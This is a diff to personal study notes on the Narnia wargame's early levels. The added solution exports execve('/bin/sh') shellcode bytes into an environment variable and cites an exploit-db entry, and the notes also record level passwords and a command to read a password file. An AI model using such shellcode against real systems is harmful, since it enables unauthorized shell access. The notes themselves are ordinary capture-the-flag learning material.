@@ -78,6 +78,7 @@ int main()
 - to set environment variables in linux, `EGG="test"`, `export` keywoard would make the variable scope inside all derive process.
 - we can only pass a function that returns integer and doesn't get parameters and is built in the stdio.h library.<br>
   tested system and printf functions but the function throws segmentation fault.
+- segmentation fault -> you access  memory that "does not belong to you".
 - 
 ### Attemps
 - add a `export EGG="system(\"bin/sh\")"`, didn't work. The idea is to pass that will run the command `cat /etc/narnia_pass/narnia2`
@@ -95,13 +96,19 @@ int main()
     return 0;
   }
   ```
-- 
+### Solusion 
+to execute the a shell he passed a python -c with print that prints the bytes of execve(/bin/sh).<br>
+```C
+export EGG=`python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'`
+export EGG=$(python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')
+```
+He used https://www.exploit-db.com/exploits/44594 for the byte array.<br>
+The new idea for solving this level is `shellcoding`, for further info see `pwn.md`.
 ### Passwords
 level
 - 0 -> `efeidiedae` : no time + help
+- 0 -> `nairiepecu` : no time + help
 
-
-## Buffer overflow
 
 
 ## Terms
